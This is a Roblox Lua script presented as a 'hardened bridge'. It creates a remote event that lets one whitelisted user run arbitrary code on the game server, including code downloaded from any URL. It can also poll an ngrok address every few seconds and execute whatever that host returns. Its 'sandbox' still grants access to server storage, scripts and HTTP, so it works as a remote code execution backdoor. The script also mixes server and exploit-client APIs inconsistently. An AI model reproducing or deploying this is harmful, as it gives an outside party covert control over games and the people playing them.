-- ============================================================
-- hardened_bridge.lua - Debugged & Loader-Compatible
-- ============================================================

-- CONFIGURATION
local API_SECRET     = ""  -- SET THIS to enable web poll. Empty = disabled.
local WHITELISTED_ID = 10149136525
local RATE_LIMIT     = 4    -- requests per...
local RATE_WINDOW    = 4    -- ...seconds
local MAX_PAYLOAD    = 50000
local MAX_DEPTH      = 3

-- Services
local Players, HttpService, CryptoService
local Workspace, Lighting, ReplicatedStorage, RunService
local CollectionService, Teams, Chat, ServerStorage, ServerScriptService

-- Auto-detect environment
local isServer = pcall(function() return game:GetService("ServerScriptService") end)

if isServer then
    Players               = game:GetService("Players")
    HttpService           = game:GetService("HttpService")
    CryptoService         = game:GetService("CryptoService")
    Workspace             = game:GetService("Workspace")
    Lighting              = game:GetService("Lighting")
    ReplicatedStorage     = game:GetService("ReplicatedStorage")
    RunService            = game:GetService("RunService")
    CollectionService     = game:GetService("CollectionService")
    Teams                 = game:GetService("Teams")
    Chat                  = game:GetService("Chat")
    ServerStorage         = game:GetService("ServerStorage")
    ServerScriptService   = game:GetService("ServerScriptService")
else
    warn("[Bridge] Not running in server context - some features limited")
    Players           = game:GetService("Players")
    HttpService       = game:GetService("HttpService")
    ReplicatedStorage = game:GetService("ReplicatedStorage")
    Workspace         = game:GetService("Workspace")
    Lighting          = game:GetService("Lighting")
    RunService        = game:GetService("RunService")
    local ok, cs = pcall(function() return game:GetService("CryptoService") end)
    CryptoService = ok and cs or nil
end

-- Whitelist check
local LP = Players.LocalPlayer
if LP and LP.UserId ~= WHITELISTED_ID then
    LP:Kick("Unauthorized")
    return
end

local Remote = ReplicatedStorage:FindFirstChild("MangoRemote")
if not Remote then
    Remote = Instance.new("RemoteEvent")
    Remote.Name = "MangoRemote"
    Remote.Parent = ReplicatedStorage
end

-- Allowed services for the sandbox proxy
local ALLOWED_SERVICES = {
    Players = true, Workspace = true, Lighting = true,
    ReplicatedStorage = true, ServerStorage = true,
    ServerScriptService = true, HttpService = true,
    RunService = true, CollectionService = true,
    Teams = true, Chat = true
}

-- Safe service accessor
local function getService(name)
    if ALLOWED_SERVICES[name] then
        local ok, svc = pcall(function() return game:GetService(name) end)
        return ok and svc or nil
    end
    return nil
end

-- Recursion depth tracker
local depth = 0

-- Sandbox environment
local function buildSandbox(source)
    depth = depth + 1
    if depth > MAX_DEPTH then
        depth = depth - 1
        error("[Sandbox] Max recursion depth exceeded")
    end

    local sandboxEnv = {
        print = function(...)
            local args = {...}
            local msg = ""
            for i, v in ipairs(args) do
                msg = msg .. tostring(v) .. (i < #args and "\t" or "")
            end
            print("[Sandbox]", msg)
        end,
        warn = function(...)
            local args = {...}
            local msg = ""
            for i, v in ipairs(args) do
                msg = msg .. tostring(v) .. (i < #args and "\t" or "")
            end
            warn("[Sandbox]", msg)
        end,
        error = function(msg)
            error("[Sandbox] " .. tostring(msg))
        end,
        pcall = pcall,
        xpcall = xpcall,
        select = select,
        pairs = pairs,
        ipairs = ipairs,
        next = next,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        unpack = table.unpack or unpack,
        table = {
            insert = table.insert, remove = table.remove,
            sort = table.sort, concat = table.concat,
            unpack = table.unpack or unpack, pack = table.pack,
            move = table.move, clear = table.clear,
            find = table.find, clone = table.clone,
            foreach = table.foreach, foreachi = table.foreachi,
            getn = table.getn, maxn = table.maxn
        },
        string = {
            sub = string.sub, gsub = string.gsub, find = string.find,
            match = string.match, gmatch = string.gmatch,
            char = string.char, byte = string.byte,
            len = string.len, upper = string.upper, lower = string.lower,
            rep = string.rep, reverse = string.reverse, format = string.format,
            split = string.split, trim = string.trim
        },
        math = {
            abs = math.abs, floor = math.floor, ceil = math.ceil,
            min = math.min, max = math.max, random = math.random,
            sqrt = math.sqrt, pow = math.pow, sin = math.sin,
            cos = math.cos, tan = math.tan, deg = math.deg, rad = math.rad
        },
        coroutine = {
            create = coroutine.create, resume = coroutine.resume,
            yield = coroutine.yield, wrap = coroutine.wrap,
            status = coroutine.status, running = coroutine.running
        },
        utf8 = utf8,
        _VERSION = _VERSION,
    }

    -- Controlled game proxy
    sandboxEnv.game = setmetatable({}, {
        __index = function(_, key)
            if key == "Players" then return Players end
            if key == "Workspace" then return Workspace end
            if key == "Lighting" then return Lighting end
            if key == "ReplicatedStorage" then return ReplicatedStorage end
            if key == "ServerStorage" then return ServerStorage end
            if key == "ServerScriptService" then return ServerScriptService end
            if key == "HttpService" then return HttpService end
            if key == "RunService" then return RunService end
            if key == "CollectionService" then return CollectionService end
            if key == "Teams" then return Teams end
            if key == "Chat" then return Chat end
            if key == "GetService" then return getService end
            if key == "GetObjects" then
                return function(url)
                    local ok, res = pcall(function()
                        return HttpService:HttpGet(url)
                    end)
                    if ok then return {res} end
                    return {}
                end
            end
            warn("[Sandbox] Blocked access to game." .. tostring(key))
            return nil
        end,
        __newindex = function()
            error("[Sandbox] Cannot modify game")
        end
    })

    -- Controlled require
    sandboxEnv.require = function(id)
        if type(id) ~= "number" then
            error("[Sandbox] require() only accepts numeric IDs")
        end
        local allowed = { [0] = true }
        if not allowed[id] then
            error("[Sandbox] require(" .. id .. ") not in allowlist")
        end
        local ok, mod
        if isServer then
            local modObj = ServerScriptService:FindFirstChild(tostring(id))
            if modObj then
                ok, mod = pcall(function() return require(modObj) end)
            else
                error("[Sandbox] Module " .. id .. " not found in ServerScriptService")
            end
        else
            ok, mod = pcall(function() return require(id) end)
        end
        if ok then
            depth = depth - 1
            return mod
        end
        error("[Sandbox] Module " .. id .. " error: " .. tostring(mod))
    end

    -- Controlled loadstring
    sandboxEnv.loadstring = function(src)
        if type(src) ~= "string" then
            error("[Sandbox] loadstring expects a string")
        end
        if #src > MAX_PAYLOAD then
            error("[Sandbox] Payload exceeds " .. MAX_PAYLOAD .. " bytes")
        end
        local fn, err = loadstring(src)
        if fn then
            setfenv(fn, buildSandbox(src))
        end
        depth = depth - 1
        return fn, err
    end

    -- Task library
    sandboxEnv.task = {
        spawn = task.spawn, delay = task.delay, wait = task.wait,
        defer = task.defer, cancel = task.cancel
    }

    -- Debug (restricted)
    sandboxEnv.debug = {
        traceback = debug.traceback
    }

    -- Instance (create limited types)
    sandboxEnv.Instance = {
        new = function(className)
            local allowed = {
                Part = true, BillboardGui = true, ScreenGui = true,
                Frame = true, TextLabel = true, TextButton = true,
                TextBox = true, ScrollingFrame = true, ImageLabel = true,
                UICorner = true, UIStroke = true, UIGradient = true,
                Folder = true, Model = true, Tool = true,
                RemoteEvent = true, RemoteFunction = true,
                IntValue = true, StringValue = true, ObjectValue = true,
                BoolValue = true, NumberValue = true
            }
            if not allowed[className] then
                error("[Sandbox] Cannot create " .. className)
            end
            return Instance.new(className)
        end
    }

    -- Color3
    sandboxEnv.Color3 = {
        new = Color3.new, fromRGB = Color3.fromRGB,
        fromHSV = Color3.fromHSV
    }

    -- UDim2
    sandboxEnv.UDim2 = {
        new = UDim2.new, fromScale = UDim2.fromScale,
        fromOffset = UDim2.fromOffset
    }

    sandboxEnv._G = sandboxEnv
    sandboxEnv._ENV = sandboxEnv

    depth = depth - 1
    return sandboxEnv
end

-- Rate limiter
local rateBucket = {}

local function checkRateLimit(player)
    local now = tick()
    if not rateBucket[player] then
        rateBucket[player] = {}
    end
    local bucket = rateBucket[player]
    while #bucket > 0 and bucket[1] < now - RATE_WINDOW do
        table.remove(bucket, 1)
    end
    if #bucket >= RATE_LIMIT then
        return false
    end
    table.insert(bucket, now)
    return true
end

-- Execute code for a player
local function executeCode(player, code)
    if not checkRateLimit(player) then
        warn("[Bridge] Rate limit hit for", player.Name)
        return
    end
    depth = 0
    local fn, err = loadstring(code)
    if not fn then
        warn("[Bridge] Syntax error:", err)
        return
    end
    local env = buildSandbox(code)
    setfenv(fn, env)
    local ok, result = pcall(fn)
    if not ok then
        warn("[Bridge] Runtime error from", player.Name, ":", result)
    end
end

-- Handle remote requests
Remote.OnServerEvent:Connect(function(player, action, payload)
    if player.UserId ~= WHITELISTED_ID then
        warn("[Bridge] Unauthorized request from", player.Name)
        return
    end
    if type(action) ~= "string" or payload == nil then
        return
    end
    if action == "LOADSTRING" then
        if type(payload) ~= "string" then return end
        if #payload > MAX_PAYLOAD then
            warn("[Bridge] Payload too large")
            return
        end
        if payload:match("^https?://") then
            local ok, code = pcall(function()
                return game:HttpGet(payload)
            end)
            if ok and code then
                executeCode(player, code)
            end
            return
        end
        executeCode(player, payload)
    elseif action == "REQUIRE" then
        local id = tonumber(payload)
        if id then
            local ok, mod
            if isServer then
                local modObj = ServerScriptService:FindFirstChild(tostring(id))
                if modObj then
                    ok, mod = pcall(function() return require(modObj) end)
                end
            else
                ok, mod = pcall(function() return require(id) end)
            end
            if ok then
                print("[Bridge] Resolved require(" .. id .. ")")
            else
                warn("[Bridge] Failed require(" .. id .. "):", mod)
            end
        end
    end
end)

-- Web poll (disabled if API_SECRET not set)
if API_SECRET ~= "" then
    task.spawn(function()
        while task.wait(3) do
            local ok, result = pcall(function()
                local response = HttpService:RequestAsync({
                    Url = "https://subventionary-letha-boughten.ngrok-free.dev",
                    Method = "GET",
                    Headers = {
                        ["X-Timestamp"] = tostring(os.time())
                    }
                })
                return response
            end)
            if ok and result and result.StatusCode == 200 then
                local body = result.Body
                if body and body ~= "" then
                    local receivedSig = result.Headers["x-signature"]
                    if receivedSig and CryptoService then
                        local ts = result.Headers["x-timestamp"] or ""
                        local computed = CryptoService:HMAC(
                            "SHA256",
                            API_SECRET,
                            body .. ":" .. ts
                        )
                        if computed == receivedSig then
                            executeCode(LP, body)
                        else
                            warn("[Bridge] Invalid HMAC signature")
                        end
                    else
                        warn("[Bridge] No signature or CryptoService unavailable")
                    end
                end
            end
        end
    end)
    print("[Bridge] Web poll active")
else
    print("[Bridge] Web poll disabled (set API_SECRET to enable)")
end

print("[Bridge] Hardened bridge initialized for", LP and LP.Name or "unknown")
